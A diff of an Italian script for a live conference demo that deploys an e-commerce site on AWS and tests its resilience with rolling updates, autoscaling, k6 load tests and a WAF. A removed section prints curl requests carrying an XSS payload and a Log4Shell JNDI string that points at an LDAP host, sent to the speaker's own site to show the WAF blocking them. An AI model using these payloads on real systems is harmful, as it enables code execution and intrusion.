@@ -10,7 +10,15 @@ Le slide contengono solo schemi e infografiche. Codice, console, terminale e sit
 
 Un'ora prima si controlla che k6 sia installato e che l'hotspot del telefono funzioni, nel caso il Wi-Fi della sala non regga.
 
-Il terminale si apre nella root del repository, con tre pannelli: il primo per deploy e seed, il secondo per k6, il terzo per il test 3.
+Il terminale si apre nella root del repository, con tre pannelli: il primo per deploy e seed, il secondo per k6, il terzo per le slide.
+
+Nel terzo pannello si avviano le slide:
+
+```sh
+pnpm slides
+```
+
+Le slide si aprono nel browser su http://localhost:3030 e con F vanno a schermo intero.
 
 Nel primo pannello si genera il template di CloudFormation, che si mostra al minuto 7:
 
@@ -46,13 +54,21 @@ Il minuto indica quando inizia ogni passo. Durante le attese le spiegazioni si a
 
 ### Minuto 1 · Il problema
 
-**SLIDE 2**: un servizio online al centro e quattro pericoli intorno: un server che muore, una nuova versione, un attacco, un picco di traffico.
+**SLIDE 2**: una bottega di arrosticini aperta, con i clienti serviti.
+
+**SLIDE 3**: la stessa bottega in quattro guai: un guasto, un aggiornamento che la chiude, una protesta che blocca l'ingresso, troppi clienti.
+
+**SLIDE 4**: gli stessi quattro casi su AWS: un task che si blocca, una nuova versione, un attacco DDoS, un picco di traffico.
 
 Un servizio su internet deve restare disponibile anche in questi quattro casi. Il talk li prova tutti, dal vivo, su un e-commerce.
 
+**SLIDE 5**: le quattro risposte di AWS: task ridondanti, rolling update, protezione DDoS, autoscaling.
+
+Per ogni caso AWS ha una risposta: un secondo task che prende il posto di quello caduto, il rolling update, un filtro davanti al sito e l'autoscaling.
+
 ### Minuto 2 · Il progetto
 
-**SLIDE 3**: il monorepo. In alto web e api, sotto i cinque domini, in fondo i package condivisi, con il logo di ogni tecnologia.
+**SLIDE 6**: il monorepo. In alto web e api, sotto i cinque domini, in fondo i package condivisi, con il logo di ogni tecnologia.
 
 Il progetto è un monorepo TypeScript gestito con pnpm e Turborepo. Contiene due servizi, web e api, ognuno con la sua immagine Docker.
 
@@ -72,7 +88,7 @@ pnpm turbo boundaries
 
 ### Minuto 3 · Il cloud
 
-**SLIDE 4**: a sinistra un data center proprio, a destra una regione AWS con le sue AZ.
+**SLIDE 7**: a sinistra un data center proprio, a destra una regione AWS con le sue AZ.
 
 Con un data center proprio i server si comprano per reggere il picco, e restano fermi il resto del tempo. Nel cloud si paga quello che si usa.
 
@@ -88,7 +104,7 @@ Un esempio è 37signals, l'azienda di Basecamp e HEY. Nel 2022 spendeva circa 3,
 
 ### Minuto 4 · Infrastructure as Code
 
-**SLIDE 5**: codice TypeScript → CDK → template CloudFormation → risorse su AWS.
+**SLIDE 8**: codice TypeScript → CDK → template CloudFormation → risorse su AWS.
 
 Le risorse non si creano a mano dalla console, ma si descrivono in un file. Il file sta in Git con il resto del codice, si può rivedere e ricrea sempre lo stesso ambiente.
 
@@ -138,23 +154,37 @@ Waf contiene le regole del firewall, app contiene tutto il resto. Questi due si 
 
 Poi si apre la console di CloudFormation. Quando waf è completo, nella console WAF si mostrano le regole. La regola RateLimit si mette in Count, così conta le richieste ma non le blocca. Altrimenti bloccherebbe k6, che manda tutte le richieste da un solo IP.
 
-### Minuto 9 · Il progetto su AWS
+### Minuto 9 · Il percorso di una richiesta
 
-**SLIDE 6**: tutta l'infrastruttura in un'unica infografica. Resta sullo schermo fino al minuto 14. Il prompt per generarla è in fondo al documento.
+**SLIDE 9**: l'infrastruttura su AWS, minimale. Resta sullo schermo fino al minuto 14. Il prompt per costruirla è in fondo al documento.
 
-Il percorso di una richiesta, al minuto 9. Il DNS di Cloudflare porta il browser a CloudFront. CloudFront gestisce HTTPS e fa controllare ogni richiesta al WAF. Immagini e asset tornano subito dalla cache. Il resto va al load balancer, che lo distribuisce tra i task web. Web costruisce la pagina e chiede i dati ad api.
+Il browser trova il sito con il DNS di Cloudflare, che lo manda a CloudFront. CloudFront gestisce HTTPS e fa controllare ogni richiesta al WAF. Immagini e asset tornano subito dalla sua cache. Il resto passa al load balancer, che lo distribuisce tra i task web. Web costruisce la pagina e chiede i dati ad api.
 
-La rete, al minuto 10. La rete privata copre due AZ. Le subnet pubbliche contengono il load balancer e i NAT, che permettono ai task di uscire su internet. Le subnet private contengono i task. Le subnet isolate contengono Valkey, che non ha accesso a internet. Ogni AZ ha il suo NAT, così se una AZ cade l'altra raggiunge ancora internet. Ogni componente accetta traffico solo dal componente prima di lui: il load balancer solo da CloudFront, web solo dal load balancer, api solo da web.
+### Minuto 10 · La rete
 
-Il calcolo, al minuto 11. I container girano su ECS Fargate, senza server da gestire. Web e api hanno da 2 a 4 task ciascuno, divisi sulle due AZ. Il load balancer controlla la salute dei task web ogni 5 secondi. Api non ha un load balancer: web lo raggiunge con Service Connect.
+Tutto sta in una rete privata, la VPC, che copre due AZ. Ogni AZ ha tre fasce di subnet. Le pubbliche contengono il load balancer e i NAT, che fanno uscire i task su internet. Le private contengono i task. Le isolate contengono Valkey, che non ha accesso a internet.
 
-Con Service Connect, api si registra con il nome api sulla porta 4000, e web lo chiama semplicemente all'indirizzo http://api:4000. ECS aggiunge a ogni task un piccolo proxy: è il container ecs-service-connect che si vede anche nella console. Il proxy di web conosce tutti i task api attivi e distribuisce le richieste a turno tra loro. Se una richiesta fallisce, la riprova su un altro task. Se un task dà 5 errori in 30 secondi, il proxy smette di usarlo per un tempo da 30 secondi a 5 minuti.
+Ogni AZ ha il suo NAT, così se una AZ cade l'altra esce ancora su internet. Ogni componente accetta traffico solo da quello prima di lui: il load balancer solo da CloudFront, web solo dal load balancer, api solo da web.
 
-Quando un task api nasce o muore, ECS aggiorna da solo l'elenco del proxy. Per questo il rolling update e lo scaling di api non richiedono nessuna modifica a web.
+### Minuto 11 · Il calcolo
 
-I dati, al minuto 12. DynamoDB contiene prodotti, utenti, ordini e pagamenti. Valkey contiene sessioni e carrelli. S3 contiene le immagini. Le chiavi Stripe stanno in Parameter Store e arrivano ai container all'avvio, quindi nel repository non c'è nessun segreto.
+I container girano su ECS Fargate, senza server da gestire. Web e api hanno da 2 a 4 task ciascuno, divisi sulle due AZ. Il load balancer controlla la salute dei task web ogni 5 secondi.
 
-La sicurezza, al minuto 13. Un sito può cadere anche senza nessun guasto: se qualcuno lo inonda di richieste, consuma la capacità che serve agli utenti veri. Lo scaling non basta, perché si ferma a 4 task, pagati per servire l'attaccante. Per questo il traffico si filtra prima che arrivi ai task. CloudFront è l'unico ingresso pubblico. Shield Standard ferma gli attacchi DDoS più comuni, quelli che inondano la rete. Il WAF blocca troppe richieste dallo stesso IP, gli IP con cattiva reputazione e gli attacchi noti.
+Api non ha un load balancer: web lo raggiunge con Service Connect. Api si registra con il nome api sulla porta 4000, e web lo chiama all'indirizzo http://api:4000. ECS aggiunge a ogni task un piccolo proxy, il container ecs-service-connect che si vede anche nella console.
+
+Il proxy di web conosce tutti i task api attivi e distribuisce le richieste a turno tra loro. Se una richiesta fallisce, la riprova su un altro task. Se un task dà 5 errori in 30 secondi, il proxy smette di usarlo per un tempo da 30 secondi a 5 minuti. Quando un task api nasce o muore, ECS aggiorna da solo l'elenco del proxy, quindi il rolling update e lo scaling di api non richiedono nessuna modifica a web.
+
+### Minuto 12 · I dati
+
+I task non tengono dati: se uno muore non si perde niente. DynamoDB contiene prodotti, utenti, ordini e pagamenti. Valkey contiene sessioni e carrelli. S3 contiene le immagini. Api parla con Stripe per i pagamenti.
+
+Le chiavi Stripe stanno in Parameter Store e arrivano ai container all'avvio, quindi nel repository non c'è nessun segreto.
+
+### Minuto 13 · La sicurezza
+
+Un sito può cadere anche senza nessun guasto: se qualcuno lo inonda di richieste, consuma la capacità che serve agli utenti veri. Lo scaling non basta, perché si ferma a 4 task, pagati per servire l'attaccante. Per questo il traffico si filtra prima che arrivi ai task.
+
+CloudFront è l'unico ingresso pubblico. Shield Standard ferma gli attacchi DDoS più comuni, quelli che inondano la rete. Il WAF blocca troppe richieste dallo stesso IP, gli IP con cattiva reputazione e gli attacchi noti.
 
 ### Minuto 14 · Eventi del deploy
 
@@ -218,7 +248,7 @@ k6 run -e BASE_URL=https://arrosticini.colagreco.dev -e VUS=20 -e DURATION=13m l
 
 ### Minuto 23 · CI/CD
 
-**SLIDE 7**: push → controlli → build delle immagini → ECR → deploy → rolling update.
+**SLIDE 10**: push → controlli → build delle immagini → ECR → deploy → rolling update.
 
 Poi si mostra GitHub Actions con la run in corso, e nell'editor i due workflow:
 
@@ -231,39 +261,17 @@ Ogni push passa lint, typecheck, test e build. Ogni release costruisce le immagi
 
 ### Minuto 24 · Come funziona il rolling update
 
-**SLIDE 8**: prima due task vN, poi due vN e due vN+1 insieme, alla fine solo i due vN+1.
-
 Nella pagina stress compaiono le pecore api vN+1, poi spariscono le vecchie.
 
 ECS avvia i task nuovi prima di spegnere i vecchi, quindi il sito ha sempre abbastanza task attivi. Un task vecchio smette di ricevere richieste, finisce quelle in corso e poi si spegne.
 
 Se i task nuovi non partono, ECS torna da solo alla versione vecchia.
 
-### Minuto 29 · CDN
-
-Nel browser si aprono i DevTools e si mostra un'immagine servita dalla cache di CloudFront.
-
-Intanto si aggiorna web. Immagini e asset arrivano dalla cache, quindi ai task arrivano meno richieste.
-
-### Minuto 30 · Test 3: un attacco
-
-Nel pannello 3 si lanciano una ricerca normale e due richieste malevole:
-
-```sh
-curl -s -o /dev/null -w "%{http_code}\n" "https://arrosticini.colagreco.dev/it/products?q=arrosticini"
-curl -s -o /dev/null -w "%{http_code}\n" "https://arrosticini.colagreco.dev/it/products?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
-curl -s -o /dev/null -w "%{http_code}\n" -H 'User-Agent: ${jndi:ldap://example.com/a}' "https://arrosticini.colagreco.dev/it"
-```
-
-Le risposte attese sono 200, 403 e 403. La ricerca normale passa. La ricerca con uno script (XSS) e l'attacco Log4Shell vengono bloccati da CloudFront e non arrivano mai ai task. Questi due non cercano di far cadere il sito: servono a eseguire codice, il primo nel browser di un utente e il secondo sul server.
-
-Nella console WAF si vedono le richieste bloccate. La regola RateLimit oggi è in Count, altrimenti bloccherebbe k6.
-
 ### Minuto 35 · Fine del rolling update
 
 Quando la pagina stress mostra solo pecore vN+1, si ferma k6 con Ctrl+C. Il riepilogo deve mostrare 0% di richieste fallite. Il footer mostra vN+1.
 
-### Minuto 35 · Test 4: un picco di traffico
+### Minuto 35 · Test 3: un picco di traffico
 
 Subito dopo, nel pannello 2:
 
@@ -272,8 +280,6 @@ k6 run -e BASE_URL=https://arrosticini.colagreco.dev -e VUS=50 -e DURATION=6m lo
 ```
 
 50 utenti virtuali navigano il sito. Web costruisce ogni pagina sul server, quindi la CPU di web sale. Con le rampe di salita e discesa il carico dura 7 minuti, quindi continua durante le domande.
-
-**SLIDE 9**: la CPU nel tempo, con le soglie del 30%, 80% e 95%, e sotto il numero di task.
 
 Quando la CPU media supera l'80%, ECS aggiunge un task. Sopra il 95% ne aggiunge due, sotto il 30% ne toglie uno. I task restano sempre tra 2 e 4.
 
@@ -285,7 +291,7 @@ Nella pagina stress compaiono le nuove pecore web. Il carico si divide e la CPU 
 
 ### Minuto 39 · Cosa abbiamo visto
 
-**SLIDE 10**: i quattro pericoli della slide 2, ognuno con la soluzione che l'ha retto.
+Si torna alla slide 5: i quattro casi, ognuno con la soluzione che l'ha retto.
 
 ### Minuto 40 · Grazie e domande
 
@@ -297,6 +303,14 @@ Se c'è tempo, si mostra la parte admin in una finestra privata, così l'utente 
 
 Se chiedono delle librerie, web usa React Router 8 su Express 5, React 19, Tailwind CSS 4, Radix UI con shadcn/ui, class-variance-authority, clsx, tailwind-merge, Lucide, Motion, i18next, react-i18next, remix-i18next, iovalkey e il client oRPC. Api usa Express 5, oRPC con OpenAPI, Zod 4, AWS SDK v3, Stripe e iovalkey. Gli strumenti sono TypeScript 7, Vite 8, Vitest 5, Supertest, Biome, tsx, Docker, GitHub Actions, AWS CDK, Playwright e k6.
 
+Se c'è ancora tempo, per ultimo si mostra un HTTP flood. Nella console WAF la regola RateLimit si rimette in Block. Poi, nel pannello 2:
+
+```sh
+k6 run -e BASE_URL=https://arrosticini.colagreco.dev -e VUS=50 -e DURATION=2m load/browse.js
+```
+
+k6 manda tutte le richieste dallo stesso IP. Oltre 2000 richieste in 5 minuti, il WAF blocca quell'IP e k6 riceve 403. Di solito succede entro 30 secondi, ma può volerci qualche minuto. Nella console WAF si vedono le richieste bloccate dalla regola RateLimit. Anche il browser ha lo stesso IP, quindi il sito si blocca anche per chi presenta: per questo si fa per ultimo.
+
 ### Minuto 60 · Destroy
 
 Nel pannello 1:
@@ -307,9 +321,9 @@ pnpm aws:app:destroy
 
 ## Se qualcosa va storto
 
-Se il deploy è lento, si allunga la spiegazione della slide 6.
+Se il deploy è lento, si allunga la spiegazione della slide 9.
 
-Se si è in ritardo prima del deploy, si salta l'esempio di 37signals. Le spiegazioni durante il deploy e il rolling update non recuperano tempo, perché si aspetta comunque AWS. Se il rolling update finisce tardi, al test 4 si avvia k6, si spiega la slide 9 e lo scaling si guarda durante le domande.
+Se si è in ritardo prima del deploy, si salta l'esempio di 37signals. Le spiegazioni durante il deploy e il rolling update non recuperano tempo, perché si aspetta comunque AWS. Se il rolling update finisce tardi, al test 3 si avvia k6 e lo scaling si guarda durante le domande.
 
 Se il deploy fallisce, si mostra l'errore in CloudFormation e si passa alla registrazione della prova generale.
 
@@ -323,24 +337,16 @@ Se al minuto 38 le nuove pecore web non ci sono ancora, si mostrano la CPU e l'a
 
 ## Da verificare nella prova generale
 
-Quanto durano davvero deploy, CI e rolling update. Se il webhook di Stripe arriva al sito su AWS e l'ordine risulta pagato. Se l'acquisto completo sta in 3 minuti. Se con 20 utenti virtuali le pecore web restano sotto l'80% di CPU durante il rolling update. Se il rolling update finisce con 0% di errori. Quanto ci mette browse con 50 utenti virtuali a far scalare web.
+Quanto durano davvero deploy, CI e rolling update. Se il webhook di Stripe arriva al sito su AWS e l'ordine risulta pagato. Se l'acquisto completo sta in 3 minuti. Se con 20 utenti virtuali le pecore web restano sotto l'80% di CPU durante il rolling update. Se il rolling update finisce con 0% di errori. Quanto ci mette browse con 50 utenti virtuali a far scalare web. Quanto ci mette il WAF a bloccare k6 con RateLimit in Block.
 
-## Prompt per l'infografica della slide 6
+## Prompt per la slide 9
 
 ```text
-Un'unica immagine con tutta l'infrastruttura di Arrosticini 24ore su AWS, in stile diagramma di architettura AWS: icone ufficiali dei servizi, riquadri per regioni, VPC, AZ e subnet, frecce con etichetta, sfondo chiaro, leggibile da lontano.
+Costruisci la slide 9 del deck Slidev come layout Vue con SVG, come la slide del monorepo, non come immagine generata. Mostra l'infrastruttura di Arrosticini 24ore su AWS ridotta all'essenziale: deve leggersi da lontano mentre parlo per cinque minuti. Testo di almeno 18px, al massimo una dozzina di elementi, frecce senza etichetta o con una sola parola, icone ufficiali AWS solo dove aiutano a riconoscere il servizio.
 
-A sinistra, fuori da AWS: l'utente con il browser, Cloudflare DNS con il CNAME arrosticini.colagreco.dev verso CloudFront, Stripe in modalità test (Checkout ospitato da Stripe e webhook verso il sito) e GitHub Actions, che entra su AWS con OIDC senza chiavi salvate.
+Il pubblico deve capire tre cose: c'è un solo ingresso, tutto è doppio sulle due AZ e i dati stanno fuori dai task.
 
-Al centro, la fascia "Global / us-east-1": CloudFront, unico ingresso pubblico in HTTPS, che serve /assets/* e /images/* dalla cache e manda il resto all'ALB senza cache; il WAF agganciato a CloudFront, con rate limit per IP, AWS IP Reputation List, AWS Common Rule Set (OWASP) e AWS Known Bad Inputs; Shield Standard, incluso in CloudFront; il certificato HTTPS di Certificate Manager.
+Gli elementi: a sinistra l'utente e, sotto, Stripe, fuori da AWS. Poi CloudFront. A destra il riquadro della regione eu-south-1, con dentro la VPC divisa in due colonne, eu-south-1a ed eu-south-1b, e in tre fasce orizzontali: pubblica, privata e isolata. Nella fascia pubblica l'ALB, steso sulle due colonne, e un NAT per colonna. Nella fascia privata un task web e un task api per colonna. Nella fascia isolata Valkey, steso sulle due colonne. Nella regione ma fuori dalla VPC, DynamoDB e S3.
 
-A destra, il riquadro più grande: la regione "eu-south-1 (Milano)". Dentro c'è la VPC 10.10.0.0/16, con l'Internet Gateway in alto e due colonne, eu-south-1a ed eu-south-1b, ognuna con tre fasce di subnet. Nella pubblica, un NAT Gateway per AZ e l'Application Load Balancer steso su entrambe le colonne. Nella privata, i task ECS Fargate: almeno un web (porta 3100) e un api (porta 4000) per AZ, 0,25 vCPU e 512 MB ciascuno, da 2 a 4 task per servizio, raggruppati dall'etichetta "ECS cluster arrosticini-cluster". Nell'isolata, ElastiCache Serverless for Valkey 9, senza uscita verso internet. Ai bordi della VPC, i gateway endpoint per S3 e DynamoDB.
-
-Sotto la VPC, i servizi gestiti: DynamoDB con 7 tabelle on-demand (prodotti, utenti, email degli utenti, ordini, pagamenti, clienti Stripe, eventi Stripe), S3 con le immagini dei prodotti, Parameter Store con i segreti cifrati (chiavi Stripe e segreto delle sessioni), CloudWatch con log e alarm della CPU, ECR con le immagini arrosticini/web e arrosticini/api.
-
-Le frecce hanno l'etichetta tra virgolette. Il percorso del sito: utente → Cloudflare DNS "risolve il nome"; utente → CloudFront "HTTPS"; CloudFront → WAF "ogni richiesta viene filtrata"; CloudFront → ALB "HTTP, porta 80, solo dagli IP di CloudFront"; ALB → task web delle due AZ "porta 3100, health check /healthz ogni 5 s"; web → api "Service Connect, http://api:4000". I dati: web → Valkey "sessioni, porta 6379, TLS"; api → Valkey "carrelli, porta 6379, TLS"; api → DynamoDB "dati" e api → S3 "immagini", tramite i gateway endpoint. L'esterno: task → NAT Gateway della propria AZ → Internet Gateway "uscita verso internet"; api → Stripe, passando dal NAT, "pagamenti"; Stripe → CloudFront → ALB → web → api "webhook dei pagamenti". La gestione: Parameter Store → task "segreti all'avvio"; ECR → task "immagini Docker"; task → CloudWatch "log"; CloudWatch → Application Auto Scaling → ECS "scaling da 2 a 4 task: +1 sopra l'80% di CPU, +2 sopra il 95%, -1 sotto il 30%"; GitHub Actions → ECR e CloudFormation "build, push delle immagini, deploy".
-
-Sulle frecce, piccoli lucchetti per i security group: l'ALB accetta solo gli IP di CloudFront sulla porta 80, web solo l'ALB, api solo web sulla porta 4000, Valkey solo web e api sulla porta 6379.
-
-Deve risaltare che tutto è doppio sulle due AZ (task, NAT, subnet) e che l'unica porta d'ingresso è CloudFront con il WAF.
+Non mettere porte, CIDR, security group, nomi delle tabelle, dimensioni dei task, Cloudflare DNS, Certificate Manager, Parameter Store, gateway endpoint, ECR, CloudWatch, Auto Scaling, GitHub Actions o CloudFormation: li dico a voce o stanno in altre slide.
 ```
